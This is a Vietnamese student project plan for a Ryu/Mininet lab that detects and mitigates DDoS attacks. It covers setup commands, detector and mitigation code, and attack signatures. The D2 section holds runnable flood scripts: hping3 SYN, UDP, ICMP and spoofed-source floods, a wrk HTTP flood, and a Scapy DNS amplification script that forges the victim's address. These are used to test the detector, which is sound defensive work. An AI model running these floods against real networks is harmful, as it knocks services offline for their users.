🌅 NGÀY D1 — Setup + Lab + Survey + Design + Baseline
Mục tiêu cuối D1: repo + Trello + Overleaf chạy; topology_v4 12-host pingall pass; baseline 30' + stats; 10–12 paper khảo sát; design doc detection + mitigation; smoke test topology pass.

     	
    sdn-dos-detection/	
 	├── README.md                      	# TV1 1.1 — D1 Sáng	
 	├── setup.sh                       	# TV2 2.1 — D1 Sáng	
 	├── requirements.txt               	# TV2 2.1 — D1 Sáng	
 	├── .gitignore                     	# TV5 5.1 — D1 Sáng	
 	├── .gitmessage                    	# TV1 1.1 — D1 Sáng	
 	├── .github/	
 	│   ├── pull_request_template.md   	# TV5 5.1 — D1 Sáng	
 	│   └── workflows/	
 	│   	└── ci.yml                 	# TV5 5.1 — D1 Sáng (pytest unit on PR)	
 	│	
 	├── code/	
 	│   ├── topology/	
 	│   │   └── topology_v4.py         	# TV2 2.1b — D1 Trưa  (xem docs/TOPOLOGY_V4.md)	
 	│   ├── l3_router_test.py          	# router cũ — KHÔNG sửa	
 	│   ├── l3_router_extended.py      	# TV4 4.2 — D2 Sáng (kế thừa router cũ + REST)	
 	│   ├── whitelist.txt              	# TV4 4.2 — D2 Sáng	
 	│   ├── policy.yaml                	# TV4 4.2 (skeleton) → 4.8 (final D3 Chiều)	
 	│   ├── entropy.py                 	# TV3 3.2 — D2 Sáng (Shannon + Rényi)	
 	│   ├── stats.py                   	# TV3 3.3 — D2 Trưa (Z + EWMA + CUSUM)	
 	│   ├── signature_matcher.py       	# TV3 3.4 — D2 Chiều (AST-safe)	
 	│   ├── alert_system.py            	# TV3 3.5 — D3 Sáng	
 	│   ├── detector.py                	# TV3 3.5 — D3 Sáng (orchestrator)	
 	│   ├── feature_extraction.py      	# TV2 2.5 — D2 Chiều (10 features)	
 	│   ├── dashboard.py               	# TV1 1.9 A+B → C+D → E+F (D2 Tối → D3)	
 	│   ├── templates/	
 	│   │   └── index.html             	# TV1 1.9 — D2 Tối	
 	│   ├── mitigation/	
 	│   │   ├── __init__.py	
 	│   │   ├── block.py               	# TV4 4.3 — D2 Trưa (FlowMod drop)	
 	│   │   ├── ratelimit.py           	# TV4 4.4 — D2 Chiều (Meter Table OF1.3)   
 	│   │   └── blacklist.py           	# TV4 4.6 — D3 Sáng (RAM TTL)	
 	│   ├── pipeline/	
 	│   │   └── influx_writer.py       	# TV2 2.5b — D2 Chiều	
 	│   ├── attack_scripts/	
 	│   │   ├── s01_syn.sh             	# TV2 2.3 — D2 Sáng	
 	│   │   ├── s02_udp.sh             	# TV2 2.3 — D2 Sáng	
 	│   │   ├── s03_icmp.sh            	# TV2 2.3 — D2 Sáng	
 	│   │   ├── s04_http.sh            	# TV2 2.3 — D2 Sáng	
 	│   │   ├── s05_dns_ampl.sh        	# TV5 5.10 — D2 Sáng	
 	│   │   ├── s06_spoof.sh           	# TV5 5.10 — D2 Sáng	
 	│   │   ├── s07_slowloris.sh       	# TV5 5.10 — D2 Trưa	
 	│   │   └── s08_flashcrowd.sh      	# TV5 5.10 — D2 Trưa	
 	│   ├── scripts/	
 	│   │   └── compute_baseline.py    	# TV2 2.2 — D1 Chiều	
 	│   ├── run_scenario.py            	# TV5 5.4 — D3 Trưa (harness)	
 	│   └── run_all.sh                 	# TV5 5.5 — D3 Trưa (8 × 3 = 24 run)	
 	│	
 	├── docs/	
 	│   ├── TOPOLOGY_V4.md             	# đã tạo (full code §3)	
 	│   ├── TOPOLOGY_CHANGES.md        	# TV2 2.1b — D1 Trưa (diff V3→V4)	
 	│   ├── LITERATURE_SURVEY.md       	# TV1 1.2 — D1 Trưa→Chiều (12 paper)	
 	│   ├── THEORY_BACKGROUND.md       	# TV1 1.3 — D1 Chiều (~1500 từ)	
 	│   ├── ATTACK_SIGNATURES.md       	# TV1 1.4 — D1 Chiều	
 	│   ├── attack_signatures.csv      	# TV1 1.4 — D1 Chiều (BLOCKING TV3 3.4)	
 	│   ├── detection_design.md       	 # TV3 3.1 — D1 Trưa	
 	│   ├── mitigation_design.md       	# TV4 4.1 — D1 Sáng→Trưa	
 	│   ├── EVALUATION_PROTOCOL.md     	# TV1 1.5 — D2 Tối (BLOCKING 1.10 + 5.6)	
 	│   ├── HUONG_DAN_TV1.md           	# bản hướng dẫn cá nhân (đã sync)	
 	│   ├── HUONG_DAN_TV2.md	
 	│   ├── HUONG_DAN_TV3.md	
 	│   ├── HUONG_DAN_TV4.md	
 	│   └── HUONG_DAN_TV5.md	
 	│	
 	├── tests/	
 	│   ├── conftest.py                	# TV5 5.1 — D1 Sáng	
 	│   ├── README.md                  	# TV5 5.2 — D1 Chiều	
 	│   ├── fixtures/	
 	│   │   ├── baseline.json          	# TV2 2.2 — D1 Chiều	
 	│   │   ├── features_benign.csv    	# TV5 5.2 — D1 Chiều	
 	│   │   └── features_attack.csv    	# TV5 5.2 — D1 Chiều	
 	│   ├── test_topology.py           	# TV2 2.x — D1 Tối (smoke)	
 	│   ├── test_entropy.py            	# TV3 3.2 — D2 Sáng (5 test)	
 	│   ├── test_stats.py              	# TV3 3.3 — D2 Trưa (3 test)	
 	│   ├── test_signature.py          	# TV3 3.4 — D2 Chiều	
 	│   ├── test_mitigation.py         	# TV4 4.3/4.4 — D2 Trưa→Chiều	
 	│   ├── test_regression_router.py  	# TV5 5.2b — D2 Trưa	
 	│   └── test_integration.py        	# TV5 5.3 — D3 Sáng (E2E s01)	
 	│	
 	├── datasets/                      	# KHÔNG commit (xem .gitignore)	
 	│   ├── baseline.pcap              	# TV2 2.2 — D1 Chiều	
 	│   ├── s01_syn.pcap … s08_flashcrowd.pcap   # sinh khi chạy attack	
 	│   └── baseline_stats.json        	# TV2 2.2	
 	│	
 	├── results/                       	# KHÔNG commit raw	
 	│   ├── raw/   
 	│   │   ├── alerts.json            	# TV3 3.5 ghi	
 	│   │   └── run_<scenario>_<i>/    	# TV5 5.5 — D3 Trưa	
 	│   ├── benchmark.csv              	# TV1 1.10 — D3 Chiều	
 	│   ├── mitigation_latency.csv     	# TV4 4.7 — D3 Trưa	
 	│   └── stress_test.csv            	# TV5 5.7 — D3 Chiều	
 	│	
 	├── figs/                          	# 6 figure 300dpi cho IEEE	
 	│   ├── fig1_topology.pdf          	# TV5 5.6 — D3 Chiều	
 	│   ├── fig2_pipeline.pdf	
 	│   ├── fig3_entropy_timeseries.pdf	
 	│   ├── fig4_confusion_matrix.pdf	
 	│   ├── fig5_latency_box.pdf	
 	│   └── fig6_throughput_drop.pdf	
 	│	
 	├── slides/	
 	│   ├── main.tex                   	# TV5 5.8 — D3 Tối (Beamer)	
 	│   └── backup_demo_3min.mp4       	# TV5 5.8 — D3 Tối	
 	│	
 	└── report/                        	# Overleaf mirror (optional)	
     	└── ieee_main.tex              	# TV1 1.7+1.8 — D3 Tối	
      	
      	


☀️ D1 Sáng (08:00–12:00) — Khởi động
🟧 [TV1] Task 1.1 — Tổ chức khởi động (D1 Sáng)  [BLOCKING toàn bộ commit/PR]
[ ] Bước 1. Tạo GitHub repo sdn-dos-detection, branch main + protect rule (≥1 review).
[ ] Bước 2. Mời 4 thành viên + cấp quyền write.
[ ] Bước 3. Commit README.md với:
# SDN DDoS Detection (Group N4)
Phát hiện + giảm thiểu DDoS volumetric đơn nguồn trong SDN Ryu+Mininet.
[ ] Bước 4. Tạo Trello board 6 cột (Backlog/Doing/Review/Done/Blocked/Notes), add 5 thành viên.
[ ] Bước 5. Tạo Overleaf project IEEE template, share read-only public link.
[ ] Bước 6. Lập group chat (Discord/Zalo) + ghim link repo, Trello, Overleaf.
DoD: repo + Trello + Overleaf truy cập được bởi 5 TV.
🟩 [TV2] Task 2.1 — Dựng lab Mininet + Ryu (D1 Sáng)  [BLOCKING TV2/TV3/TV4/TV5 toàn bộ phần code]
[ ] Bước 1. Cài đặt:
sudo apt update && sudo apt install -y mininet python3-pip openvswitch-switch
pip3 install ryu==4.34 scapy influxdb-client psutil pyyaml
[ ] Bước 2. Verify Ryu: ryu-manager --version → 4.34.
[ ] Bước 3. Verify Mininet: sudo mn --test pingall (topology mặc định).
[ ] Bước 4. Tạo setup.sh:
#!/bin/bash
set -e
sudo apt install -y mininet openvswitch-switch
pip3 install -r requirements.txt
[ ] Bước 5. requirements.txt:
ryu==4.34
scapy>=2.4
influxdb-client>=1.36
psutil
pyyaml
flask
[ ] Bước 6. Commit [TV2] setup: Mininet + Ryu + requirements.
DoD: setup.sh chạy fresh Ubuntu 20.04/22.04 không lỗi; sudo mn --test pingall pass.
🟪 [TV5] Task 5.1 — Repo hygiene (D1 Sáng)  [PARALLEL TV1]
[ ] Bước 1. Thêm .gitignore:
__pycache__/
*.pyc
datasets/
results/raw/
*.pcap
*.log
[ ] Bước 2. Cấu trúc thư mục skeleton:
code/  docs/  tests/  results/  slides/  datasets/
[ ] Bước 3. tests/conftest.py với fixture chung (path resolver).
[ ] Bước 4. Mẫu PR template .github/pull_request_template.md: mô tả + checklist (test pass / docstring / cite paper).
[ ] Bước 5. Commit [TV5] repo: gitignore + skeleton + PR template.
🟥 [TV4] Task 4.1 — Design graduated response (D1 Sáng → Trưa)  [PARALLEL] [BLOCKING TV4 4.2]
[ ] Bước 1. Tạo docs/mitigation_design.md mô tả 3 cấp:
Cấp 1 LOG: alert đầu tiên → ghi log, không can thiệp.
Cấp 2 RATE-LIMIT: alert ≥ 2 trong 30s → cài Meter Table OF1.3 giới hạn 1000 pps.
Cấp 3 BLOCK: alert critical hoặc ≥ 3 alert → FlowMod drop 60s.
[ ] Bước 2. Sơ đồ flowchart bằng Mermaid.
[ ] Bước 3. Gửi review TV3 + TV1.

🌤️ D1 Trưa (12:00–14:00) — Topology + Survey + Detection design
🟩 [TV2] Task 2.1b — Nâng cấp topology_nhom4.py → topology_v4.py (D1 Trưa) ⭐ BẮT BUỘC  [DEPENDS 2.1] [BLOCKING TV3/TV4/TV5]
[ ] Bước 1. Copy topology_nhom4.py → code/topology/topology_v4.py.
[ ] Bước 2. Thêm import + đổi switch sang OVS OF1.3:
from mininet.link import TCLink
from mininet.node import OVSKernelSwitch
s2 = self.addSwitch('s2', cls=OVSKernelSwitch, protocols='OpenFlow13')
[ ] Bước 3. Thêm 4 host PC (h_pc1–h_pc4 trong subnet 10.0.4.0/24) → đủ 12 host.
[ ] Bước 4. Đổi tất cả addLink → addLink(..., cls=TCLink, bw=10, delay='1ms') cho external links.
[ ] Bước 5. Tạo QoS HTB queue trong addSwitch callback (queue1 1Mbps, queue2 5Mbps).
[ ] Bước 6. Verify:
sudo python3 code/topology/topology_v4.py
mininet> pingall
*** Results: 0% dropped (132/132 received)
mininet> iperf h_att1 h_web1
*** Results: ['8.55 Mbits/sec', '8.97 Mbits/sec']
[ ] Bước 7. docs/TOPOLOGY_CHANGES.md ghi diff V3→V4 (5 switch giữ nguyên, +4 host PC, +TCLink, +OF1.3, +HTB queue).
[ ] Bước 8. Commit [TV2] topology: v4 với TCLink + OF1.3 + 12 host.
DoD: pingall 0% dropped; iperf 7–10 Mbps cho external; OVS verify ovs-ofctl -O OpenFlow13 dump-flows s2 không lỗi.
🟦 [TV3] Task 3.1 — Design doc detection_design.md (D1 Trưa)  [PARALLEL]
[ ] Bước 1. Tạo docs/detection_design.md mô tả pipeline 4 tầng:
Tầng 1 Feature: 10 feature/window 1s (5 entropy + pps + bps + syn% + icmp% + new_flows).
Tầng 2 Entropy detector: Shannon + Renyi q=2 trên src_ip/dst_ip/dst_port; threshold động.
Tầng 3 Stats detector: Z-score + EWMA + CUSUM trên pps/bps.
Tầng 4 Signature matcher: AST-safe eval rule từ attack_signatures.csv.
[ ] Bước 2. Mỗi tầng cite 2–3 paper (Lakhina 2005, Page 1954 CUSUM, Renyi 1961, Shannon 1948).
[ ] Bước 3. Sơ đồ Mermaid: Ryu REST → feature → 3 detector → aggregate → AlertSystem.
[ ] Bước 4. Commit [TV3] design: detection 4-layer pipeline.
🟧 [TV1] Task 1.2 — Khảo sát 10–12 papers (D1 Trưa → Chiều)  [PARALLEL]
[ ] Bước 1. Lập danh sách 10–12 paper SDN-DDoS (IEEE/ACM 2018–2024). Gợi ý:
Group A (entropy): Lakhina 2005, Mousavi 2014, Kalkan 2018, Bhushan 2018.
Group B (signature): Yu 2018, Gou 2019, Tan 2020, Phan 2020.
Group C (ML): Tang 2016, Ahmed 2020 (đối chiếu, nhóm chỉ làm threshold).
Group E (stats CUSUM/EWMA): Page 1954, Wang 2015.
[ ] Bước 2. Tạo docs/LITERATURE_SURVEY.md với mỗi paper:
## A1. Lakhina 2005 — "Mining Anomalies Using Traffic Feature Distributions"
- **Method:** Shannon entropy 4 features.
- **Result:** TPR 95%, FPR 3% trên Abilene.
**Liên hệ đề tài:** Áp dụng s01 SYN flood, ngưỡng entropy_src<1.5.
[ ] Bước 3. Bảng so sánh 12 dòng × 6 cột (paper, year, method, dataset, TPR, FPR).
[ ] Bước 4. Commit [TV1] survey: 12 paper IEEE/ACM.

🌇 D1 Chiều (14:00–18:00) — Baseline + Theory + Signatures + Tách entropy
🟩 [TV2] Task 2.2 — Thu baseline 30 phút (D1 Chiều)  [DEPENDS 2.1b] [BLOCKING TV3 stats]
[ ] Bước 1. Khởi động router cũ l3_router_test.py + topology_v4.
[ ] Bước 2. Trên h_pc1–h_pc4 sinh traffic baseline:
# Cron-like script bên trong h_pc1
while true; do
curl -s http://10.0.2.10/ > /dev/null
dig @10.0.2.11 example.com > /dev/null
sleep $((RANDOM % 5 + 1))
done
[ ] Bước 3. Capture pcap 30':
sudo tcpdump -i s2-eth1 -w datasets/baseline.pcap -G 1800 -W 1
[ ] Bước 4. Tính baseline stats:
# code/scripts/compute_baseline.py
from scapy.all import PcapReader
import json, math
from collections import Counter
pcap = "datasets/baseline.pcap"
pps_list = []; entropy_list = []
# ... window 1s, tính pps + entropy_src_ip
json.dump({"pps":{"mu":..., "sigma":...},
           "entropy_src":{"mu":..., "sigma":...}},
          open("tests/fixtures/baseline.json","w"))
[ ] Bước 5. Verify tests/fixtures/baseline.json có 4 key (pps/bps/entropy_src/entropy_dport, mỗi key có mu+sigma).
[ ] Bước 6. Commit [TV2] baseline: 30' pcap + stats fixture.
DoD: baseline.pcap ≥ 100MB; baseline.json 4 metric × {mu, sigma}.
🟧 [TV1] Task 1.3 — THEORY_BACKGROUND.md (D1 Chiều, ~1500 từ)  [PARALLEL]
[ ] Bước 1. 5 phần:
SDN + OpenFlow 1.3 (Meter Table, FlowMod, controller).
DDoS taxonomy (volumetric L3/L4/L7, amplification, slow attack, flash crowd).
Shannon + Renyi entropy q=2 (công thức + giải thích trực giác).
Z-score + EWMA + CUSUM (Page 1954).
Signature matching (AST-safe eval rationale).
[ ] Bước 2. 3 sơ đồ Mermaid: SDN stack, entropy curve attack vs benign, CUSUM cumulative.
[ ] Bước 3. Cite ≥ 8 paper (lấy từ Task 1.2).
[ ] Bước 4. Commit [TV1] theory: 1500 từ + 3 sơ đồ.
🟧 [TV1] Task 1.4 — ATTACK_SIGNATURES.md + .csv (D1 Chiều)  [BLOCKING TV3 3.4]
[ ] Bước 1. Tạo docs/attack_signatures.csv đủ 8 attack:
name,desc,rule,thresholds,features,papers
s01_syn_flood,SYN Flood,"entropy_src<1.5 AND syn_pct>0.6","1.5;0.6","entropy_src;syn_pct","A1;B1"
s02_udp_flood,UDP Flood,"entropy_src<1.5 AND pps>5000","1.5;5000","entropy_src;pps","A2;B2"
s03_icmp_flood,ICMP Flood,"icmp_pct>0.5 AND pps>3000","0.5;3000","icmp_pct;pps","A3"
s04_http_flood,HTTP Flood,"entropy_dst_port<2 AND syn_pct>0.4","2;0.4","entropy_dst_port;syn_pct","B4"
s05_dns_ampl,DNS Amplification,"avg_pkt_size>500 AND entropy_src_ip>3","500;3","avg_pkt_size;entropy_src","C2"
s06_spoof,IP Spoof,"entropy_src_ip>4.5 AND pps>3000","4.5;3000","entropy_src;pps","B3"
s07_slowloris,Slowloris,"new_flows_per_sec<5 AND entropy_dst_port<1","5;1","new_flows;entropy_dst_port","B5"
s08_flashcrowd,Flash Crowd,"entropy_src_ip>4 AND pps>mu","4;-","entropy_src;pps","-"
[ ] Bước 2. docs/ATTACK_SIGNATURES.md mô tả markdown từng dòng + bảng tổng.
[ ] Bước 3. Commit [TV1] signatures: 8 rule CSV + MD.
🟦 [TV3] Task 3.2b — Tách logic entropy khỏi router cũ (D1 Chiều)  [DEPENDS 4.1]
[ ] Bước 1. Đọc l3_router_test.py xác định 3 hàm entropy: _compute_entropy, _monitor_entropy, _window_buffer.
[ ] Bước 2. Copy 3 hàm sang code/entropy.py skeleton (chưa optimize, để TV3 task 3.2 viết lại đầy đủ).
[ ] Bước 3. Đảm bảo router cũ vẫn chạy độc lập (không phụ thuộc file mới).
[ ] Bước 4. Commit [TV3] refactor: tách entropy logic ra module riêng.
🟪 [TV5] Task 5.2 — Test fixtures + README (D1 Chiều)  [PARALLEL]
[ ] Bước 1. Tạo tests/fixtures/baseline.json giả (4 key pps/bps/entropy_src/entropy_dport, mean+std).
[ ] Bước 2. Tạo tests/fixtures/features_benign.csv (10 row baseline) + features_attack.csv (10 row SYN flood mô phỏng).
[ ] Bước 3. Tạo tests/README.md hướng dẫn layout + cách chạy:
Unit (không cần Mininet): pytest tests/test_entropy.py tests/test_stats.py tests/test_signature.py tests/test_mitigation.py -v
Integration (cần root): sudo pytest tests/test_integration.py -v --timeout=120

🌃 D1 Tối (18:00–22:00) — Smoke test + Mốc D1
🟩 [TV2] Task 2.x — Unit test test_topology.py (D1 Tối)
[ ] Bước 1. Tạo tests/test_topology.py:
"""Smoke test topology_v4: ping + bandwidth."""
import subprocess, time, pytest

@pytest.fixture(scope="module")
def net():
    proc = subprocess.Popen(["sudo", "python3", "code/topology/topology_v4.py"],
                            stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(8)
    yield proc
    proc.communicate(b"exit\n", timeout=10)

def test_pingall(net):
    net.stdin.write(b"pingall\n"); net.stdin.flush()
    time.sleep(15)
    out = net.stdout.read1(4096).decode()
    assert "0% dropped" in out

def test_bw_external(net):
    net.stdin.write(b"iperf h_att1 h_web1\n"); net.stdin.flush()
    time.sleep(15)
    out = net.stdout.read1(4096).decode()
    assert any(f"{x} Mbits" in out for x in range(7, 14))
[ ] Bước 2. sudo pytest tests/test_topology.py -v.
[ ] Bước 3. Commit [TV2] test: smoke topology pingall + iperf bw.
🟧 [TV1] Task 1.2 (cont.) — finalize bảng so sánh + commit nếu chưa.
🟥 [TV4] Task 4.1 (kết) — gửi review + chốt design 3 cấp.

✅ Cuối D1 — Mốc M_D1
[ ] Repo + Trello + Overleaf chạy (TV1 1.1).
[ ] setup.sh + requirements.txt (TV2 2.1).
[ ] topology_v4.py 12-host pingall pass + iperf 7–10 Mbps + OF1.3 (TV2 2.1b).
[ ] baseline.pcap 30' + baseline.json 4 metric × {mu, sigma} (TV2 2.2).
[ ] LITERATURE_SURVEY.md 10–12 paper + bảng (TV1 1.2).
[ ] THEORY_BACKGROUND.md ~1500 từ + 3 sơ đồ (TV1 1.3).
[ ] attack_signatures.csv 8 dòng + ATTACK_SIGNATURES.md (TV1 1.4).
[ ] detection_design.md 4-layer pipeline (TV3 3.1).
[ ] mitigation_design.md graduated response 3 cấp (TV4 4.1).
[ ] entropy.py skeleton tách từ router cũ (TV3 3.2b).
[ ] .gitignore + skeleton dirs + PR template (TV5 5.1).
[ ] tests/fixtures/ + tests/README.md (TV5 5.2).
[ ] test_topology.py smoke pass (TV2 2.x).

🌅 NGÀY D2 — Implementation core (Detection + Mitigation + Features + Dashboard skeleton)
Mục tiêu cuối D2: 4 attack scripts s01–s04 chạy + 4 attack s05–s08; entropy.py + stats.py + signature_matcher.py 13 unit test pass; l3_router_extended.py + BlockModule + RateLimitModule chạy thông; feature_extraction.py + 5 CSV; dashboard A+B; EVAL protocol.

☀️ D2 Sáng (08:00–12:00) — Attack scripts + Entropy + Router
🟩 [TV2] Task 2.3 — Sinh 4 kịch bản s01–s04 (D2 Sáng)  [BLOCKING TV3 entropy + TV4 router]
Quy ước chung: mỗi script in START_TS=<epoch> khi bắt đầu, END_TS=<epoch> khi kết thúc. TV5 dùng để cắt window ground truth.
s01 — SYN Flood
[ ] Bước 1. Tạo code/attack_scripts/s01_syn.sh:
#!/bin/bash
VICTIM=10.0.2.10
DURATION=300
echo "START_TS=$(date +%s)"
tcpdump -i s2-eth99 -w datasets/s01_syn.pcap -G $DURATION -W 1 &
TCPDUMP_PID=$!
hping3 -S -p 80 --flood $VICTIM &
HPING_PID=$!
sleep $DURATION
kill $HPING_PID $TCPDUMP_PID 2>/dev/null
echo "END_TS=$(date +%s)"
[ ] Bước 2. chmod +x + test trong xterm h_att1.
[ ] Bước 3. Sau 5', kiểm ls -lh + tshark -r datasets/s01_syn.pcap -c 5.
s02 — UDP Flood — copy s01 → đổi hping3 --udp -p 53 --flood 10.0.2.11. Cảnh báo F.3.2: với bw=10Mbps, --flood saturate ngay → đổi -i u100 (1 packet mỗi 100µs) khi cần đo dải.
s03 — ICMP Flood — hping3 -1 --flood 10.0.2.10.
s04 — HTTP GET Flood — chạy h_web1 python3 -m http.server 80 &, dùng wrk -t4 -c400 -d300s http://10.0.2.10/.
[ ] Test cả 4 script chạy 5' không lỗi, mỗi pcap ≥ 50MB.
[ ] Gửi template cho TV5 viết s05–s08.
[ ] Commit [TV2] attack: scripts s01–s04 SYN/UDP/ICMP/HTTP flood.
🟦 [TV3] Task 3.2 — entropy.py (D2 Sáng) — Paper A1, A2, B3, B4  [DEPENDS 2.2 baseline + 3.2b skeleton]
[ ] Bước 1. Tạo code/entropy.py:
"""Shannon + Renyi entropy detector. Cite: A1 Kumar 2018, B4 Bhuyan 2015."""
import math, json
from collections import Counter, deque

def shannon(items):
    c = Counter(items); n = sum(c.values())
    return -sum((v/n)*math.log2(v/n) for v in c.values()) if n else 0

def renyi(items, q=2):
    c = Counter(items); n = sum(c.values())
    if n == 0: return 0
    s = sum((v/n)**q for v in c.values())
    return (1/(1-q)) * math.log2(s) if s > 0 else 0

class EntropyDetector:
    def __init__(self, baseline_path='datasets/baseline_stats.json',
                 k_sigma=3, adaptive_window_sec=300):
        b = json.load(open(baseline_path))
        self.mu = {k: v["mean"] for k,v in b.items()}
        self.sigma = {k: v["std"] for k,v in b.items()}
        self.k = k_sigma
        self.recent = deque(maxlen=adaptive_window_sec)

    def check(self, features):
        alerts = []
        for key in ('entropy_src_ip', 'entropy_dst_port', 'entropy_renyi_src'):
            v = features.get(key, 0)
            mu, sig = self.mu.get(key, 0), self.sigma.get(key, 1)
            if abs(v - mu) > self.k * sig:
                alerts.append({"source": "entropy", "feature": key,
                               "value": v, "deviation": (v-mu)/sig})
        self.recent.append(features)
        return {"anomaly": len(alerts) > 0, "alerts": alerts}

    def update_baseline(self):
        """Gọi mỗi 5' nếu KHÔNG có alert — adaptive baseline."""
        if len(self.recent) < 60: return
        import statistics
        for key in self.mu:
            vals = [f[key] for f in self.recent if key in f]
            if len(vals) > 10:
                self.mu[key] = statistics.mean(vals)
                self.sigma[key] = max(statistics.stdev(vals), 1e-6)
[ ] Bước 2. Tạo tests/test_entropy.py với 5 test: shannon_uniform, shannon_single, renyi_q2, detector_flood, detector_normal.
[ ] Bước 3. pytest tests/test_entropy.py -v → 5 test pass.
[ ] Bước 4. Commit [TV3] entropy: Shannon + Renyi + adaptive baseline (cite A1, B4).
DoD: 5 unit test pass; module không phụ thuộc Ryu (testable độc lập).
🟥 [TV4] Task 4.2 — l3_router_extended.py kế thừa router cũ (D2 Sáng) ⭐  [DEPENDS 4.1] [BLOCKING TV4 4.3/4.4 + TV5 5.3]
[ ] Bước 1. Đọc l3_router_test.py cũ — hiểu class SimpleRouterEntropy.
[ ] Bước 2. Tạo code/l3_router_extended.py:
"""Mitigation router — kế thừa SimpleRouterEntropy + REST + graduated response."""
from ryu.ofproto import ofproto_v1_3
from ryu.app.wsgi import WSGIApplication, ControllerBase, route
from l3_router_test import SimpleRouterEntropy
from code.mitigation import BlockModule, RateLimitModule, BlacklistManager
import json, yaml, time

class L3RouterExtended(SimpleRouterEntropy):
    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]
    _CONTEXTS = {'wsgi': WSGIApplication}

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        wsgi = kwargs['wsgi']
        wsgi.register(AlertAPI, {'router': self})
        self.WHITELIST_SRC = self._load_whitelist('code/whitelist.txt')
        self.policy = yaml.safe_load(open('code/policy.yaml'))
        self.violation_count = {}
        self.last_violation = {}
        self.block = BlockModule(self)
        self.ratelimit = RateLimitModule(self)
        self.blacklist = BlacklistManager(self)

    def _load_whitelist(self, path):
        try:
            return set(l.strip() for l in open(path) if l.strip()
                       and not l.startswith('#'))
        except FileNotFoundError:
            return set()

    def handle_alert(self, payload):
        src = payload['src_ip']
        if src in self.WHITELIST_SRC:
            self.logger.info(f"[whitelist] skip {src}"); return
        if time.time() - self.last_violation.get(src, 0) > 60:
            self.violation_count[src] = 0
        self.violation_count[src] = self.violation_count.get(src, 0) + 1
        self.last_violation[src] = time.time()
        n = self.violation_count[src]
        for dp in self._datapaths.values():
            if n == 1:
                self.logger.warning(f"[GR1 LOG] {src} attack={payload['attack']}")
            elif n == 2:
                self.ratelimit.apply(dp, src, pps=1000)
            else:
                self.block.apply(dp, src, timeout=60)
                self.blacklist.add(src, ttl=60)

class AlertAPI(ControllerBase):
    def __init__(self, req, link, data, **config):
        super().__init__(req, link, data, **config)
        self.router = data['router']

    @route('alert', '/api/alert', methods=['POST'])
    def receive_alert(self, req, **kw):
        payload = json.loads(req.body)
        self.router.handle_alert(payload)
        return req.create_response(body=b'{"ok":true}',
                                   content_type='application/json')

    @route('block', '/api/block', methods=['POST'])
    def manual_block(self, req, **kw):
        payload = json.loads(req.body)
        self.router.handle_alert({**payload, "attack": "manual"})
        return req.create_response(body=b'{"ok":true}')
[ ] Bước 3. Tạo code/whitelist.txt (DNS, gateway):
# Trusted IPs — KHÔNG bao giờ block
10.0.1.1
10.0.2.1
10.0.3.1
10.0.4.1
10.0.2.11
[ ] Bước 4. Tạo code/policy.yaml:
graduated_response:
  - level: 1
    action: log
    threshold: 1
  - level: 2
    action: rate_limit
    pps: 1000
    threshold: 2
    duration: 120
  - level: 3
    action: block
    threshold: 3
    duration: 60
[ ] Bước 5. Test: ryu-manager --wsapi-port 8081 code/l3_router_extended.py + curl -X POST http://localhost:8081/api/alert -d '{"src_ip":"10.0.1.10","attack":"syn_flood"}'.
[ ] Bước 6. Commit [TV4] router: kế thừa SimpleRouterEntropy + REST API + graduated response.
🟪 [TV5] Task 5.10 — s05 DNS Amplification + s06 IP Spoof (D2 Sáng)  [DEPENDS 2.3 template]
s05 — DNS Amplification — Scapy spoof src=victim, query DNS ANY tới h_dns1, resp đổ về victim:
#!/bin/bash
VICTIM=10.0.2.10; DNS=10.0.2.11; DURATION=300
echo "START_TS=$(date +%s)"
tcpdump -i s2-eth99 -w datasets/s05_dns_ampl.pcap -G $DURATION -W 1 &
python3 - <<PY &
from scapy.all import IP, UDP, DNS, DNSQR, send
pkt = IP(src="$VICTIM", dst="$DNS")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype=255))
while True: send(pkt, verbose=0)
PY
sleep $DURATION; kill %1 %2 2>/dev/null
echo "END_TS=$(date +%s)"
Verify resp/req >10× bằng tshark -r datasets/s05_dns_ampl.pcap -Y dns.
s06 — IP Spoof Flood — hping3 --rand-source -S -p 80 --flood 10.0.2.10.

🌤️ D2 Trưa (12:00–14:00) — Stats + Self-DoS fix + BlockModule + Slow attacks
🟥 [TV4] Task 4.2c — Sửa lỗi self-DoS controller (D2 Trưa) ⚠️  [DEPENDS 4.2]
[ ] Bước 1. Tìm hàm xử lý packet không khớp whitelist trong code cũ.
[ ] Bước 2. Thay punt mọi gói bằng flow tạm idle_timeout=5s + sample 128B:
def _install_sample_flow(self, dp, src_ip):
    parser = dp.ofproto_parser; ofp = dp.ofproto
    match = parser.OFPMatch(eth_type=0x0800, ipv4_src=src_ip)
    actions = [parser.OFPActionOutput(ofp.OFPP_NORMAL),
               parser.OFPActionOutput(ofp.OFPP_CONTROLLER, max_len=128)]
    inst = [parser.OFPInstructionActions(ofp.OFPIT_APPLY_ACTIONS, actions)]
    mod = parser.OFPFlowMod(datapath=dp, priority=10,
                            match=match, instructions=inst, idle_timeout=5)
    dp.send_msg(mod)
[ ] Bước 3. Verify: hping3 --flood → controller CPU < 30% (trước fix saturate 100%).
[ ] Bước 4. Commit [TV4] router: fix self-DoS punt-to-controller (sample 128B + idle 5s).
🟦 [TV3] Task 3.3 — stats.py (D2 Trưa) — Paper E4
[ ] Bước 1. Tạo code/stats.py:
"""Z-score + EWMA + CUSUM detector. Cite: E4 Page 1954."""
import json
from collections import deque

class StatsDetector:
    def __init__(self, baseline_path='datasets/baseline_stats.json',
                 alpha=0.3, k_factor=0.5, h_factor=5):
        b = json.load(open(baseline_path))
        self.mu = {k: v["mean"] for k,v in b.items()}
        self.sigma = {k: v["std"] for k,v in b.items()}
        self.alpha = alpha
        self.k_factor = k_factor
        self.h_factor = h_factor
        self.ewma = {k: v["mean"] for k,v in b.items()}
        self.cusum = {k: 0.0 for k in b}

    def zscore(self, key, x):
        mu, sig = self.mu[key], max(self.sigma[key], 1e-6)
        z = (x - mu) / sig
        return {"alert": abs(z) > 3, "score": z, "source": "zscore", "feature": key}

    def ewma_check(self, key, x):
        self.ewma[key] = self.alpha * x + (1-self.alpha) * self.ewma[key]
        dev = abs(x - self.ewma[key])
        return {"alert": dev > 3*self.sigma[key], "score": dev,
                "source": "ewma", "feature": key}

    def cusum_check(self, key, x):
        mu, sig = self.mu[key], max(self.sigma[key], 1e-6)
        k = self.k_factor * sig
